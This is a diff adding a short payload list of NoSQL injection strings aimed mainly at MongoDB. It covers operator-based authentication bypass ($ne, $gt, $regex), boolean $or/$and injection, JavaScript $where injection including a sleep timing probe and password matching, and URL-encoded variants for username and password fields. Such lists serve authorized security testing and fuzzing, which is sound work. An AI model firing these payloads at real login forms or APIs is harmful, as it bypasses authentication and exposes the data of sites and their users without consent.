@@ -1,0 +1,18 @@
+# NoSQL Injection Payloads (primarily MongoDB)
+# Operator injection — authentication bypass
+{"$gt":""}
+{"$ne":"invalid"}
+{"$regex":".*"}
+{"$exists":true}
+{"$nin":[]}
+# Boolean operator injection
+{"$or":[{},{"a":"a"}]}
+{"$and":[{},{"a":"a"}]}
+# JavaScript injection ($where)
+{"$where":"return true"}
+{"$where":"sleep(3000)"}
+{"$where":"this.password.match(/.*/)"}
+# URL-encoded operator injection
+username[$ne]=invalid&password[$ne]=invalid
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
